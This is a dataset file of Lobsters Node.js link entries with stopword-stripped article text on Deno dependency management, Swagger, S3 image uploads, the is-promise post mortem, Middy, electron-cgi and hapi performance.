47,Lobsters,nodejs,Node.js programming,Deno is a Browser for Code,https://kitsonkelly.com/posts/deno-is-a-browser-for-code/,deno browser code,browser discovering code repeatable build trusting code dependency management line code time week snowpack oak server pika cdn importmaps origin trial chrome,started contributing deno soon ry made prototype visible may frequent question people package manager often time even form question statement like thought deno took security seriously downloading resource internet insecure possibly manage dependency opinion need shift mental model lot folk take ubiquity package manager centralized code registry requirement package manager centralized code registry exist mean required came existence solved problem particular way accepted way solve problem would argue true browser order publish website login central google server upload website registry someone want view website use command line tool add entry browserjson file local machine go fetch whole website plus website one website link local website directory fire browser actually look website would insane right accept model running code deno cli work like browser code import url code deno go fetch code cache locally like browser also like browser code run sandbox zero trust code running irrespective source person invoking code get tell code externally also like browser code ask permission thing choose grant deny http protocol provides everything needed provide information code deno try fully leverage protocol without create new protocol discovering code first thing think like browser deno cli want opinion code run lay rule code fetched sandbox machine run opinion much opinion runtime nodejsnpm ecosystem conflated management code local machine centralized registry code help facilitate discovery opinion really bad flaw back early day internet experimented npm type discoverability would go add website yahoo right categorization people would come along maybe use search function structured based opinion providing content really based optimizing need consumer eventually along came google google win useful indexed website way matched simple expression need search term relevant web page met need looking multiple factor including meta data provided content provider one factor mix model quite yet code deno model work addition use google solves problem u instead told must use google well also viable alternative google got bit debate laurie voss twitter someone know fair deal npm ecosystem would say argued deno needed package manager blog post longer winded version thought wanted express laurie raised valid point github become home open source code useful solved problem built top de facto source code versioning tool git deno cli perspective technical restriction source code wider ecosystem create evolve way make code deno discoverable probably innovative way could never conceived u creating cli repeatable build npm ecosystem became problem heavy reliance semantic versioning complex dependency graph tend come nodejsnpm ecosystem repeatable build became real problem yarn introduced concept lock file npm followed suit personal feeling bit tail wagging dog behaviour developer ecosystem created problem needed imperfect solution fix u lived ecosystem long time know fix lot issue rm rf nodemodules packagelockjson npm install said deno two solution first deno cache module cache checked source control cachedonly flag ensure attempt retrieve remote module denodir environment variable used specify cache located provide flexibility second deno support lock file lock lockjson lockwrite would write lock file hash dependency given workload would used validate future run lock lockjson used also couple command make managing repeatable build deno cache would resolve dependency supplied module populate deno cache deno bundle used generate single file build workload dependency resolved included file single file needed future deno run command trusting code another area think skewed mental model whatever reason put trust code centralized registry even think trust code fully vetted dependency trusted quick search type npm install somerandompackage think fine argue rich npm package ecosystem lulled sense complacency compensate laxness complacency implement security monitoring software tool chain analyse dependency thousand upon thousand line code let u know maybe code exploitable corporation setup private registry host package might vetted slightly single public registry feel like elephant room best strategy trust code established opening back becomes little easier lying think package manager centralised registry solve problem even substantially help problem fact argue make use let guard well npm bad surely someone would take deno aspect quite done think starting good position zero trust startup provides fairly fine grained permission one thing personally dislike flag basically saying oh yeah allow everything easy thing frustrated developer instead figuring really need also hard break permission say code code code prompt escalate privilege code coming hopefully figure easy use mechanism coupled something would effective performant runtime try solve challenge recent change though good one opinion deno longer allows downgrade import something imported http import http location follows browser model able downgrade transport still think longer term would good kill remote import http much like service worker require http see future hold dependency management think need talk frankly dependency npm ecosystem honest broken ecosystem enables line code downloaded installed million time week code every browser last year never needed nodejs broken ecosystem one example actual code byte package size runnable code package size fine opinion several factor involved big part model inverted talked deno browser code problem backwards model infected create website central registry build website download code depend bake something load server user downloads bunch code local machine evidence around code downloaded unique site web application rest code downloading development workstation bundling model broken problem solution like snowpack trying solve another significant problem dependency coupled code put dependency packagejson code actually us code totally decoupled code express using code loosely coupled version code contained packagejson though biggest impact code write code actually consuming dependent code lead u deno model like call depsinjs since cool kid injs thing explicitly stating external dependency url mean code depends upon code concise clear code dependency tightly coupled together want see dependency graph simply need use deno info local remote module deno info http denolandxoakexamplesserverts local type typescript compiled denogenhttpsdenolandxoakexamplesservertsjs map denogenhttpsdenolandxoakexamplesservertsjsmap deps http denolandxoakexamplesserverts http denolandstd http denolandxoakmodts http denolandxoakapplicationts http denolandxoakcontextts http denolandxoakcookiests http denolandxoakhttperrorts http denolandxoakdepsts http denolandstd http denolandstd http denolandstd http denolandstd http denolandstd snip deno strong opinion around version code url url url deno requires appropriate medium type order understand treat code opinion code serve left web server server implement semantic versioning heart content sort magical mapping url resource want deno care example http denolandx effectively nothing url redirect server rewrite url include git commitish reference redirected url http denolandxoak becomes http github serf nice versioned module course spreading versioned remote url throughout codebase make lot sense great thing dependency code though structure way want common convention use depsts reexports dependency might want take look one oak server copyright oak author right reserved mit license file contains external dependency oak depends upon std dependency export http denolandstd export response serve server serverrequest servetls http denolandstd export status statustext http denolandstd export cooky cookie setcookie getcookies delcookie http denolandstd export basename extname join isabsolute normalize parse resolve sep http denolandstd export assert http denolandstd party dependency export contenttype lookup http denolandxmediatypes created oak server maintained month release deno deno std library including moving mediatypes internal oak std library ejected std library thing think hey need package manager manage one benefit typescript get comprehensive validation compatibility code code dependency raw typescript written deno great let say want take advantage preprocessing typescript javascript still ability consume remote code safely deno support couple different way allow happen seamless support xtypescripttypes header header indicates deno type file located used type checking javascript file depending upon pika cdn support package available cdn type associated serve header deno also fetch type use type checking file said may still need remap remote local dependency expressed code case unstable implementation importmaps used proposal specification part incubator browser standard come allows map provided map particular dependency code another resource local file remote module implemented deno extended period time really hoped would become adopted widely sadly origin trial chrome gotten wider adoption yet led u putting behind unstable flag deno personal opinion still big risk dead end avoided suspect lot people still coming list objection model deno think strategy deno tried take aligned deal real problem arise lot objection hear people new deno worked tried understand might different way said collectively run problem compelling need change something deno cli confident happen lot problem simply exist way solve require runtime strong opinion coupled external programme manage code challenge flirt bit package manager centralised package repository see go might never go back
48,Lobsters,nodejs,Node.js programming,"Today’s Javascript, from an outsider’s perspective",http://lea.verou.me/2020/05/todays-javascript-from-an-outsiders-perspective/,today javascript outsider perspective,john lea node john lea node lea lea lea john firefox lea john firefox john lea firefox lea lea john,today tried help friend great computer scientist j person use j module found github since past year day job usability research teaching mit help cringe slog lo behold pile unnecessary error condition cryptic error lack proper feedback feel good job communicating frustration went one hour gave went bit like note name package people changed protect identity also omitted issue faced specific package hand error reconstructed memory let know got anything wrong john hey want try algorithm found github say use import functionname packagename call functionname argument seems simple enough really need ui gon na use node lea sure node seems appropriate john run npm install packagename save recommended package readmejohn run node indexjs node warning load e module set type module packagejson use mjs extension syntaxerror use import statement outside module john run npm init generate john run npm init go wizard add type module manually generated packagejsonjohn run node indexjs node syntaxerror use import statement outside module oddly error thrown internal module project time wat lea ok screw run browser module pure j algorithm use node apis work john make simple indexhtml script type module src indexjs john load indexhtml browser nothing console nada cricket lea oh need adjust module path import packagename node special stuff resolve based nodemodules browser need specify explicit path john look filesystem nodemodules directory lea oh ran npm install packagejson probably try john run npm install packagename save john oh yeah nodemodules john desperately look nodemodules find entry pointjohn edits indexjs accordingly reloads indexhtml firefox incorrect mime type texthtml lea oh file dude day without localhost javascript severely restricted file today john ok fine going start localhost john start localhost visit indexhtml http firefox incorrect mime type texthtml john sigh need configure localhost serve j file textjavascript mime type lea know look network tab suspect find module returning html page complains mime type error page textjavascript look nodemodules corrects path turn v code collapse folder subfolder noticed fwiw think good usability improvement v code behalf improves efficiency need make visible happened firefox syntaxerror missing formal parameter lea coming package source fault look line john click line throwing error lea oh goodness javascript typescript j extension john wanted run one line code test john give concludes never touch node npm module barge pole end note john computer scientist know fair bit web node npm installed knew mime type could start localhost needed hope actual novice
49,Lobsters,nodejs,Node.js programming,What I don't like about Node.js,https://steelbrain.me/2020/05/17/what-i-dont-like-about-node-js.html,nt like nodejs,nt like nodejs nodejs webpack rollup parcel pundle magicstring require javascriptcore voodooattack nexusjs concurrent variable access,nt like nodejs may nodejs javascript runtime built chrome javascript engine working nodejs many year part pleasant productive experience prototyping speed ability scale quickly written particularly optimized code amazing often fall short try optimize tho hit architectural limitation faster expect please keep mind rant product representing time reading future may longer true would hope short version proper multi threading atomic object access long version personal experience short coming nodejs come result trying write fast module bundler nodejs case know module bundler like webpack rollup parcel deprecated pundle piece software take program dependency bundle single file sometimes chunk often consumed browser module bundlers let require import dependency browser without hassle writing script tag hand maintain order dependency configure much gist module bundler become widely successful configurable work well reasonably fast configurability reasonably fast difficult achive together come learn experience example control step pipeline parse file continue work ast onwards making configurable mean step much pas resultant string buffer next step module bundlers current time work around manipulating string directly using magicstring something similar using allows infer trivial thing replace import internal reference making pipeline configurable however mean someone could put babel transpilation terser minification directstringmanipulation going stop parsing reparsing another thing make difficult impossible scale number core fact share object thread nodejs ipc nodejs quite expensive expensive enough architect module bundler one process nothing task others even end bottlenecked ipc overhead serializing unserializing thousand file state different step pipeline mention want avoid reparsing file ast much much bigger source require metadata file bundle generate source map nodejs recently got proper multi threading support via workerthreads even allow sharing actual object transferring ownership buffer source lack ability transfer object instead buffer per unverified source lock entire virtual machine thread try call something parallel module bundler limited fundamental limitation engine like trying run horse race one horse work around javascriptcore j engine used inside safari however lock entire virtual machine specific execution context attempt voodooattack create runtime top rival compliment nodejs called nexusjs available github support concurrent variable access among cool thing sadly gotten love deserved module bundlers ported nexusjs change remove current worker pooling implementation would run many many time faster ala reading
50,Lobsters,nodejs,Node.js programming,The Easiest Way To Start Using Swagger in Node.js,https://medium.com/@Grantlyk/the-easiest-way-to-start-using-swagger-in-node-js-54326864e74f,easiest way start using swagger nodejs,easiest way start using swagger nodejs article go swagger might want use easiest way start using nodejs express api swagger would want use swagger document api openapi good easiest way add swagger existing api swagger ui express creating swagger definition swagger doc getting swagger additional tool swagger node swagger editor swagger codegen conclusion,easiest way start using swagger nodejsthis article go swagger might want use easiest way start using nodejs express apiwhat swagger swagger set tool developer use make building apis simpler primarily use swagger document api however swagger provides tool aid designing developing documenting testing api article focusing documenting apiwhy would want use swagger document api swagger us openapi specification considered world standard restful apis swagger tool built team behind original specification know tool built specification mindwhy openapi good openapi specification defines standard allows human machine easily understand discover capability service without access source code documentation network traffic basically writing written openapi specification read herebut short complete openapi specification relating api generate everything else generate documentation could even generate source code specification openapi language agnostic generate source code various programming language although thing outside scope articleso easiest way add swagger existing api easiest way start using swagger nodejs express api make use swagger ui express allows serve doc based jsonyaml file provide itwe need install swaggeruiexpress via npmnpm install save swaggeruiexpressproviding using need import swaggeruiexpress swagger definition go create soon serve route choosing case call apidocs import swaggerui swaggeruiexpress import swaggerdocument swaggerjson appuse apidocs swaggeruiserve swaggeruisetup swaggerdocument personally prefer declare swagger definition yaml rather json point usually install yamljs step optionalnpm install save yamljsi modify previous swaggeruiexpress setup look like following import swaggerui swaggeruiexpress import yaml yamljs const swaggerdocument yamlload swaggeryaml appuse apidocs swaggeruiserve swaggeruisetup swaggerdocument creating swagger definitionthe final part get swagger working create swagger definition file use swaggeruiexpress generate documentation create json yaml purpose article using yaml example swagger definition example see specifying openapi version got info section give meta data api title description version number also got server section specify different environment production staging integration developmentinside path start defining api route example defining user route saying perform get request route result making request http response return json payload payload array stringsyou read definition file swagger doc go depth specification good way get started swagger couple application anything easy remove reality added couple line code module api meaning decide swagger take lot remove itgetting swaggerthere definitely way get swagger like using swagger inspector inspect existing api generate swagger definition based think writing swagger definition good first step give better understanding openapi actually done hoodthere downside maintain definition work extend api working api constantly changing better way example could allow definition live alongside code making use swagger integration tool jsdoc could make use tool generate definition inspector mentioned abovein reality developer really maintaining creating documentation one form another wether generating writing usually people write documentation group brainer instead write maintain specification used generate documentation moreadditional toolsif looking different solution mind tight coupling take look swagger node cost tightly coupled code allows define swagger definition swagger editor meaning worry business logic recommend existing nodejs express apis starting something new sold swagger go right aheadif looking easy way generate stub api use swagger codegen achieve thisin conclusioni shown easily add swagger nodejs express api way allows dip toe without fully committing tool gone openapi specification would want use also touched start writing swagger definition also shown additional tool might want use really start getting swagger
51,Lobsters,nodejs,Node.js programming,Writing a Production Ready Express Server,https://hackernoon.com/writing-a-production-ready-express-server-a-step-by-step-guide-2k6732x5?source=rss,writing production ready express server,,
52,Lobsters,nodejs,Node.js programming,"What is Node.js? Where, when and how to use it with examples",https://www.simform.com/what-is-node-js/,nodejs use example,scalability high performance large community support boost development speed freedom develop apps single programming language contribution fullstack meanstack downloads ie average per day rich ecosystem,scalability nodejs application easily scalable vertically horizontal vertical scaling let add resource current node horizontal scaling enables add new node quicker furthermore nodejs application require large block entire development process work along set microservices module simple easy fit perfectly startup looking growhigh performance nodejs run google j engine complies javascript code directly machine code make resource efficient well accelerates framework speed fact google invest heavily search engine consistently improve performancelarge community support established nodejs foundation impressive group founder leading enterprise ibm microsoft fidelity sap enormous number software developer many active nodejs fan constantly contributing everevolving nurturing nodejs community support fellow developer additionally nodejs supported github make super easy fast develop support frameworkboosts development speed nodejs allows developer accelerate web app development process lightweight varied tool npm registry offer numerous solution module library create web apps acquiring value investing lesser effort nodejs along npm library help reduce bug decrease size web application reusable template optimization directly influence time marketfreedom develop apps developer working nodejs get freedom develop crossplatform apps framework like electron nwjs create crossplatform web apps nodejs since compatible desktop mobile web development mac window linux nodejs widely chosen one iot solution well looking enhance team coding efficiency performance nodejs best betsingle programming language nodejs offer cocktail similar language frontend backend javascript actually accessible flexible sound make entire web app development cycle robust seamless developer enterprise save time energy resource manhours investment productive profitable nodejs make web app development convenient also make preferred tech market todaycontribution fullstack meanstack nodejs proven potential part robust tech stack javascript undisputed leader amongst leading programming language nodejs standalone brings many benefit tech stack instance offer json module library downloads ie average per day nodejs become significant player many tech ecosystemsrich ecosystem come simplicity richness nodejs npm word come mind know npm library published every week yes package registry available new tool weekly reducing great deal time cost involved development timetomarket
53,Lobsters,nodejs,Node.js programming,Complete example of how to upload images to Amazon S3 from Angular via Express,https://www.codepedia.org/ama/complete-example-of-how-to-upload-images-to-amazon-s3-bucket-from-angular-via-express,complete example upload image amazon angular via express,complete example upload image amazon angular via express wwwbookmarksdev user setting bookmarksdev github frontend angular angular template important section input type bootstrap input note also validate event angular component note event service method backend expressjs awssdk setup getting credential multer setup multer final error handler multer storage engine multer storage engine one year upload file amazon bucket conclusion make pull request,complete example upload image amazon angular via express blog post present complete example upload image amazon bucket way frontend implemented angular backend implemented nodejsexpressjs based real use case running production wwwbookmarksdev register account possibility change profile picture something personal user setting source code bookmarksdev available github let jump tutorial frontend angular start front end part angular template namely html template part angular div ngif userdata async userdatavar else loading class navigationspacebuffer profile image class fa faportrait div class profileimage img ngif selectedfilesrc userdatavarprofileimageurl else robot src selectedfilesrc userdatavarprofileimageurl height alt user profile image br br ngtemplate robot div class genericprofileimage class fa farobot div ngtemplate div class customfile input imageinput type file accept image class formcontrol id picture change changeimage imageinput label class customfilelabel style cursor pointer picture label div div div hidden imagefileistoobig class alert alertdanger image file selected big max div div ngif profileimagechangedstatus ok class alert alertsuccess image profile updated successfully div div ngif profileimagechangedstatus fail class alert alertdanger image profile failed update div hr div async force page rendering wait displaying image image upload input src attribute img element set selectedfilesrc point new changed image immediately displayed existing profile userdatavarprofileimageurl order important otherwise robot font character shown img ngif selectedfilesrc userdatavarprofileimageurl else robot src selectedfilesrc userdatavarprofileimageurl height alt user profile image br important section input type file div class customfile input imageinput type file accept image class formcontrol id picture change changeimage imageinput label class customfilelabel style cursor pointer picture label div wrapped bootstrap customfile input paragraph note type file input element let user choose file device storage tell browser accept image accept image also validate uploaded file type server also see backend section native change event input fired call changeimage imageinput input element defined template reference variable imageinput enables u make call label input element display file name size file uploaded browser label class customfilelabel style cursor pointer picture label user uploads picture bigger user get instant feedback via div hidden imagefileistoobig class alert alertdanger image file selected big max div finally user informed via profileimageuploadstatus variable whether profile image change successful div ngif profileimagechangedstatus ok class alert alertsuccess image profile updated successfully div div ngif profileimagechangedstatus fail class alert alertdanger image profile failed update div angular component let see angular component look like component selector appuserprofile templateurl userprofilecomponenthtml styleurls userprofilecomponentscss export class userprofilecomponent implement oninit userprofileform formgroup profileimagechangedstatus init uploadimagelabel choose file max size imagefileistoobig false selectedfilesrc string method import skipped brevity changeimage imageinput htmlinputelement const file file imageinputfiles thisuploadimagelabel filename filesize tofixed mb filesize thisimagefileistoobig true else thisimagefileistoobig false const reader new filereader readeraddeventlistener load event thisselectedfilesrc eventtargetresult thisuserdataserviceuploadprofileimage thisuserdatauserid file subscribe response thisuserdataprofileimageurl responseurl thisuserdatastoreupdateuserdata thisuserdata subscribe thisprofileimagechangedstatus ok thisprofileimagechangedstatus fail thisprofileimagechangedstatus fail file readerreadasdataurl file note define couple helper variable beginning profileimagechangedstatus use inform user picture changed successfully uploadimagelabel input label text change file name size one uploaded selectedfilesrc used display picture rapidly even loaded amazon bucket give user taste look like imagefileistoobig flag notify user image file big image file uploaded extracted file attribute htmlinputelement define filereader asynchronously read content image file readerreadasdataurl file file successfully read ie load event triggered upload image file backend via userdataservice thisuserdataserviceuploadprofileimage thisuserdatauserid file see implementation method subscribing method mentioned give feedback user change successful service method injectable export class userdataservice private usersapibaseurl url web api constructor private httpclient httpclient thisusersapibaseurl environmentapiurl personalusers uploadprofileimage userid string image file observable const formdata new formdata formdataappend image image return thishttpclientpost thisusersapibaseurl userid profilepicture formdata import method absent brevity service method use formdata interface construct basically form data send backend format encoding type would multipartformdata requires key value pair image key formdata second paramater file see following section handle backend backend expressjs let see handle upload backend const imagevalidationhelper require imagevalidationhelper const aws require awssdk awsconfigupdate accesskeyid processenvawsaccesskeyid secretaccesskey processenvawssecretaccesskey region processenvawsregion const new const multer require multer const require const path require path const upload multer limit filesize filefilter imagevalidationhelperimagefilter storage bucket bookmarksdev acl publicread cachecontrol contenttype metadata function req file cb cb null fieldname filefieldname key function req file cb const key userprofileimages processenvnodeenv reqparamsuserid datenow tostring pathextname fileoriginalname cb null key method import exclude brevity save profile picture usersrouterpost useridprofilepicture keycloakprotect uploadsingle image name attribute file element form async request response useridtokenvalidatorvalidateuserid request return responsestatus httpstatusok send url requestfilelocation awssdk setup upload image bucket need install awssdk package npm install awssdk configure const aws require awssdk awsconfigupdate accesskeyid processenvawsaccesskeyid secretaccesskey processenvawssecretaccesskey region processenvawsregion credential region come environment variable option explained aws sdk documentation getting credential multer setup expressjs backend multer nodejs middleware way handle multipartformdata uploading image npm install save multer const new const multer require multer const require const path require path const upload multer limit filesize filefilter imagevalidationhelperimagefilter storage bucket bookmarksdev acl publicread cachecontrol contenttype metadata function req file cb cb null fieldname filefieldname key function req file cb const key userprofileimages processenvnodeenv reqparamsuserid datenow tostring pathextname fileoriginalname cb null key first verify size le limit filesize multer standard express error case catch final error handler appuse function error req re next resheaderssent return next error else errorcode limitfilesize multer error see http githubcomexpressjsmulterblobmasterlibmultererrorjs http githubcomexpressjsmulter errorhandling return re status httpstatusbadrequest json httpstatus httpstatusbadrequest message errorcode errormessage stack appget env development errorstack else resstatus errorstatus httpstatusinternalservererror ressend message errormessage stack appget env development errorstack secondly check uploaded file image via filefilter imagevalidationhelperimagefilter option implementation filter const validationerror require errorvalidationerror const imagefilter function req file cb accept image fileoriginalnamematch jpgjpgjpegjpegpngpnggifgif reqfilevalidationerror image file allowed return cb new validationerror method accespts image jpgjpgjpegjpegpngpnggifgif file uploaded image false cb null true exportsimagefilter imagefilter check file extension need one list multer storage engine storage bucket bookmarksdev acl publicread cachecontrol contenttype metadata function req file cb cb null fieldname filefieldname key function req file cb const key userprofileimages processenvnodeenv reqparamsuserid datenow tostring pathextname fileoriginalname cb null key use multer storage engine upload file provide following option bucket bookmarksdev bucket store file acl publicread owner get fullcontrol user get read access case user profile picture public cachecontrol maxage caching set maxim recommended one year metadata contains metadata object sent set fieldname image value come formdata frontend key name file bucket environment specific user specific userid plus current date original file name upload file amazon bucket finally upload file bucket calling single method multer middleware save profile picture usersrouterpost useridprofilepicture keycloakprotect uploadsingle image name attribute file element form async request response useridtokenvalidatorvalidateuserid request return responsestatus httpstatusok send url requestfilelocation upload successful send ok status back response put public url image bucket get requestfilelocation attribute conclusion know upload picture amazon bucket angular expressjs also learned validate upload frontend backend suggestion please leave comment better yet make pull request
54,Lobsters,nodejs,Node.js programming,is-promise post mortem,https://medium.com/@forbeslindesay/is-promise-post-mortem-cab807f18dcc,ispromise post mortem,add typescript declaration file ispromise support e module style import mistake lot require timeline broken version ispromise export field packagejson submitted pull request merge release ryan pull request fresh ticket jordan harband explains release fixed version contributing factor step taken prevent future problem rolling version ispromise http githubcomthenispromisereleases,last saturday made decision try catch many contribution open source project one first pull request decided merge one add typescript declaration file ispromiseafter merging decided would also good time update module support e module style import specifically wanted able import ispromise ispromise without needing synthetic default import enabled ran test passed published new versioni intending set project automatically published via ci instead manually published local machine ispromise tiny library figured probably worth effort definitely mistake however even setup publishing via ci ispromise may sufficiently thorough testsmistakesit turn made lot mistake publishing new update repository npmignore file assumed file array packagejson failed update array include new indexmjs filewhen adding export field packagejsonas way tell newer version nodejs e module version assumed path worked main instead require prefixi understood export field packagejsonrestricts import import even though change allowed import indexjs file would break code require ispromiseindex require ispromiseindexjs also considered fact export field packagejson prevented importing require ispromisepackagejson restriction imposed export probably good long run really necessitate testing made breaking published broken version ispromise primary issue export field ryan zimmerman submitted pull request fixed thing receive facebook message asking check github first point realise something merge release ryan pull request majority people fix library many people still cached version people importing via odd path export packagejson read various issue comment close create fresh ticket productive jordan harband explains export still breaking remove export packagejson altogether release fixed unpublished broken version attempt force anyone lock file update themin total library broken approximately hourscontributing factorsvarious factor enabled make mistake made releasing local machine always make tempting skip important step creating pull request letting ci test changesour test covered actual code check published npmwe testing latest version nodejsi easy reach incident although multiple contributor github repository permission deploy new versionssteps taken prevent future problemsrolling version ispromise incident decided set everything robust possibly could also decided safest thing publish change new major version avoid breaking thing people even using undocumented approach importi spent last month building rolling version tool help safely publish package via continuous integration along great change log added ispromise give much greater confidence future releasesreleasing continuous integration one biggest thing help prevent incident like writing change log also really effective way help review change think impact really effective write change log part pull request rather fact see increase detail change log move writing afterthought writing part pull request http githubcomthenispromisereleasesif want know rolling version would like kept date thought software development open source subscribe mailing list
55,Lobsters,nodejs,Node.js programming,"Middy, Node.js middleware framework for AWS Lambda, goes 1.0.0",https://loige.co/middy-1-is-here/,middy nodejs middleware framework aws lambda go,middy middy middleware framework aws lambda nodejs terraform cloudformation sam serverless framework github star digit downloads per week middyorgjs release page github dedicated migration guide video youtube next middy list issue github looking help githubcommiddyjsdiscuss alternative middy closing note theburningmonk stefanoabalsamo padraigobrien quasimodal,middy nodejs middleware framework aws lambda finally graduated long awaited milestone project post discus middy main feature first stable release middy hearing middy first time middy middleware framework aws lambda written nodejs middy goal simplify way write lambda code essentially providing convenient middleware abstraction similar one find framework express fastify middleware framework simplify code reuse testing avoid code duplication middy also provides collection middlewares installed configured fullfil common use case authentication authorization caching data validation deserialization serialization etc give feeling using middy look like snippet code const middy require middycore const jsonbodyparser require middyhttpjsonbodyparser const httperrorhandler require middyhttperrorhandler const validator require middyvalidator const processpayment async event context const creditcardnumber expirymonth expiryyear cvc nameoncard amount eventbody return result success message payment processed correctly const inputschema type object property body type object property creditcardnumber type string minlength maxlength pattern expirymonth type integer minimum maximum expiryyear type integer minimum maximum cvc type string minlength maxlength pattern nameoncard type string amount type number required creditcardnumber const handler middy processpayment use jsonbodyparser use validator inputschema use httperrorhandler moduleexports handler example see middy help keep handler code core lambda function clean possible handler free handle sort pre post condition data serialization validation managing pre postconditions done help default custom middlewares middlewares easily reused across different lambda needed nothing new come framework express fastify surprisingly yet common lambdaland middy first one framework offer capability context best feature middy since focus code layer use infrastructurelevel tool commonly use including terraform cloudformation sam serverless framework integration seamless install use library code external dependency npm middy new open source term around almost year receiving contribution different people almost github star please give reading digit downloads per week impressive number humble opinion number good enough demostrate interest maturity around project want find middy technical perspective check official website middyorgjs main change version core official middlewares distributed separated npm package allows install package actually need help keeping lambda slim allow bootstrap fast interesting change new official middlewares bug fix number improvement term feature stability usability read full list change release page github already using middy version read dedicated migration guide personally quite impressed honoured contribution spontaneously provided growing community around middy want personally thank celebrate people contributed project following video click picture see full video youtube thank next middy hard question community definitely asking number interesting thing like better integration typescript better clear support promise asyncawait better documentation feeling framework still improved hell lot term usability follow list issue github find common topic feel free open new issue want suggest new feature improvement looking help moment honest maintainer project feel like great job make project progress limited code review merge feature request quite passively lacking vision initiative able steer project forward bring next stage truth involved serverless used last year probably lacking perspective lost pace evolution serverless lambda hard proactive solid vision project want shed light people helped carry project forward want give special thank particular order use middy shy please show github created new repository foster conversation githubcommiddyjsdiscuss open issue say hello tell u using middy would like see happening next love able create cohesive community possibly pas torch group people actively involved serverless drive project forward better currently alternative middy case like middy want explore possible alternative alternative know feel free suggest alternative comment happily add article closing note feel quite happy relieved know finally reached milestone look forward seeing next project best please let know comment think regard p thanks theburningmonk stefanoabalsamo padraigobrien quasimodal feedback review
56,Lobsters,nodejs,Node.js programming,The story of how I created a way to port Windows Apps to Linux,https://www.blinkingcaret.com/2020/04/09/the-story-of-how-i-created-a-way-to-port-windows-apps-to-linux/,story created way port window apps linux,coder radio qt idea electron read first experiment electroncgi pushing adding concurrency twoway communication process net task parallel library data flow part part proof porting window store application linux nodejs net electroncgi crossplatform gui net core electroncgi crossplatform gui net core electroncgi cross platform net core gui electron twitter linkedin,day weekend sometime around summer house chore listening podcast podcast listening called coder radio specifically listening episode qt episode using qt develop crossplatform gui net application end decided give idea mainly complicated setup required developed window qt support cross compilation end license prohibitively expensive heard though humm think know way solve problem think come solution would work well context specifically business application memory usage constrained bit presumptuous naive think like perhaps let take journey promise disappoint idea net solution developing crossplatform gui option easy set develop hand technology super popular developing crossplatform apps electron electron heavily criticized heavy memory use mostly slack great application written feel super smooth vscode probably responsible enabling people able choose different operating system normally use problem develop using net electron javascript nodejs know know electronnet trust talking completely different idea electron basically nodejs start net process node use electron build ui behavior written net need nonconvoluted way sending commandsrequests node net work right turn yes work probably already use approach time time pipe output command another shell basically using idea going describe next skeptical robust let tell people database restoresbackups using technique eg cat backuparchive mongorestore archive ok beating around bush idea use stdin stdout stream create two way communication channel two process case nodejs net case stream news stdin standard input stream normally used read data terminal like program asks input stdout standard output stream write program get data show terminal redirected piped output one becomes input nodejs module named childprocess contains function spawn use spawn new process grab hold stdin stdout stderr stream using spawn create net process ability send data stdin receive data stdout look like const spawnedprocess spawn pathtoexecutable spawnedprocessstdinwrite hello net nodejs spawnedprocessstdouton data data data net simple idea moving part simple set obviously code form usable example ended creating const connection new connectionbuilder connectto dotnetexecutable build connectionsend greeting john err thegreeting consolelog thegreeting code sends request net type greeting argument john expects response net proper greeting john omitting lot detail namely actually get sent stdinstdout stream terribly important left important work net net application possible get access process stdin stdout stream available console property care required reading stream keeping open thankfully streamreader support overload read method ended looking first implementation idea net var connection new connectionbuilder withlogging build expects request named greeting string argument return string connectionon string string greeting name return hello name wait incoming request connectionlisten first experiment called implementation idea electroncgi probably best name given idea really enables execute net code nodejs allowed create demo application ui built using electron angular andor plain javascript nonui code running net calculator demo postgresql database record browser last one every keystroke query performed result returned rendered perceived performance good totally feel like native application nonui code net example one thing might obvious looking example maintain state application net one approach common electron apps use electron display web page action perform end http request server host web page mean deal http related need pick port send http request deal routing cooky etc etc approach however server net process stick around keep state setup super simple literally two line nodejs net process talking gave confidence idea good worth exploring pushing adding concurrency twoway communication process time demo possible send message nodejs net way around also everything synchronous meaning sent two request nodejs first took one minute finish wait full minute got response second request image worth thousand word would look visually sent request nodejs net every request took average complete enabling request running concurrently involved dealing concurrency concurrency hard took get right end used net task parallel library data flow library complicated subject process figuring wrote two blog post case curious dataflow tpl dataflow net core depth part part much better example request served concurrently big feature missing able send request net nodejs previously possible send request nodejs argument get response net result example connectionsend eventget enceladus event event list filtered event using filter enceladus enough simple application complex one ability net send request super important change format message exchanged using stdin stdout stream previously net stdin stream would receive request node response request sent using stdout stream support duplex communication message included type could request response later added error well also changed api nodejs connectionsend requesttype optionalargument err optionalresponse err exception object exception net handler also added ability use promise try const response await connectionsend requesttype optionalarg catch err handle err handle request net connectionon requestype optionalargument optionally return response net connectionon requesttype argument return optional response send connectionsend requesttype optionalargument optionalresponse use response also async version var response await connectionsendasync requesttype optionalargument proof porting window store application linux first started idea imagined good proof would viable would pick application built using mvvm able take viewmodels ui agnostic use unaltered application using approach thankfully game built window store around still source code game named memory ace still find window store turn able reuse code create crossplatform version problem running ubuntu also able run window problem mac could try want look source code find also source electroncgi nodejs net also blog post extra information electroncgi crossplatform gui net core electroncgi crossplatform gui net core electroncgi cross platform net core gui electron also see easy setup project electroncgi using outdated version process identical managed grab attention kindly ask help personally affected pandemic working contractor company badly affected hospitality sector let everyone go included appreciate might position offer job help appreciated example company open role suggest well versed net nodejs react angular several technology maybe even referral program know role could good fit let know twitter dm open linkedin profile take care stay safe related
57,Lobsters,nodejs,Node.js programming,Hapi: A Performance deep-dive,https://www.nearform.com/blog/hapi-a-performance-deep-dive/,hapi performance deepdive,improving hapi performance realworld use case hapi clinicjs disclaimer setting benchmark benchmark used fastify autocannon initial improvement new url api nodejs added lazy parsing url avoid roundtrip wrapped property another getter moved class method instead code generation commit promise garbage collection conclusion clinicjs clinicjs rise top diagnosing nodejs performance issue,improving hapi performance realworld use casesrecently tasked investigating performance popular web framework hapi performance mean lot different thing wanted see could improve request per second hapi could perform realworld use case realworld mean juicing stats improve various benchmark score actually trying figure kind bottleneck appeared using framework application normally writing application deployed wider audienceif know hapi popular web framework nodejs frequently popping best framework list across web always fun challenge u try improve code used thousand user around world excited squeezing performance itwe kind performance work quite bit personal open source module also client method usually go something like get simple benchmark going le external factor better run clinicjs see recommendation come withsprint code base looking pattern pitfall often see slowing performanceget many easy win verify benchmarkgo wider try mimic production setup bit advanced benchmarksusing tool recommended clinicjs chrome devtools measure try identify fix bottlenecksmore often pattern architectural choice lower cpubound performance module fixed bunch module help identify subsequent project wellwhen looking performance thing web framework lucky lot similar library space make easier u identify bottleneck comparing score module example serving simple get request web framework fastify express faster hapi usually strong signal bottleneck waiting fixeddisclaimerit worth mentioning tuning nodejs code performance pretty serious drawback readability maintainability codebase often worth except hotpaths code ie code run lot represents bottleneck even performancetune end improvement usually better keep simpler implementation 